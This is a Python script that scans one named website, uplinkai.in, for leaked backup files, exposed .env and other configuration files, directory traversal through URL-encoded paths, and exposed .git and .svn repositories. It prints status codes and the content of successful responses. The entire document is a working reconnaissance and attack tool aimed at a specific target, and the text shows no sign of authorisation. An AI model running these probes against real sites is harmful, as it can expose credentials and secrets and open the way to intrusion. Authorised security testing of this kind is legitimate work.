import requests
import json
import time
import os

# Test for potential server-side vulnerabilities
def test_server_side_vulnerabilities():
    print("=== TESTING SERVER-SIDE VULNERABILITIES ===")
    
    base_url = "https://uplinkai.in"
    
    print("1. Testing for backup files...")
    
    # Test for common backup file extensions
    backup_files = [
        "/auth.bak",
        "/auth.backup", 
        "/auth.old",
        "/auth.tmp",
        "/auth.copy",
        "/auth.txt",
        "/auth.zip",
        "/auth.rar",
        "/auth.sql",
        "/auth.dump"
    ]
    
    for file in backup_files:
        try:
            response = requests.get(f"{base_url}{file}", timeout=10)
            print(f"{file}: {response.status_code}")
            if response.status_code == 200:
                print(f"  ⚠️  BACKUP FILE FOUND!")
        except Exception as e:
            print(f"{file}: Error - {e}")
    
    print("\n2. Testing for configuration files...")
    
    # Test for common config files
    config_files = [
        "/.env",
        "/.env.local",
        "/.env.production",
        "/config.js",
        "/config.json",
        "/database.json",
        "/settings.json",
        "/firebase.json",
        "/.htaccess",
        "/web.config"
    ]
    
    for file in config_files:
        try:
            response = requests.get(f"{base_url}{file}", timeout=10)
            print(f"{file}: {response.status_code}")
            if response.status_code == 200:
                print(f"  ⚠️  CONFIG FILE FOUND!")
        except Exception as e:
            print(f"{file}: Error - {e}")
    
    print("\n3. Testing for directory traversal...")
    
    # Test directory traversal attempts
    traversal_attempts = [
        "/auth/../",
        "/auth/../../../",
        "/auth/..%2F..%2F",
        "/auth/..%252F..%252F",
        "/auth/....//",
        "/auth/....\/",
        "/auth/%2e%2e%2f",
        "/auth/%252e%252e%252f"
    ]
    
    for attempt in traversal_attempts:
        try:
            response = requests.get(f"{base_url}{attempt}", timeout=10)
            print(f"Traversal {attempt}: {response.status_code}")
            if response.status_code == 200:
                content = response.text[:200]
                print(f"  Content preview: {content}")
        except Exception as e:
            print(f"Traversal {attempt}: Error - {e}")
    
    print("\n4. Testing for Git/SVN exposure...")
    
    # Test for version control exposure
    vcs_paths = [
        "/.git/",
        "/.git/config",
        "/.git/logs/HEAD",
        "/.git/index",
        "/.svn/",
        "/.svn/entries",
        "/.svn/wc.db"
    ]
    
    for path in vcs_paths:
        try:
            response = requests.get(f"{base_url}{path}", timeout=10)
            print(f"{path}: {response.status_code}")
            if response.status_code == 200:
                print(f"  ⚠️  VCS EXPOSURE FOUND!")
        except Exception as e:
            print(f"{path}: Error - {e}")

if __name__ == "__main__":
    test_server_side_vulnerabilities()
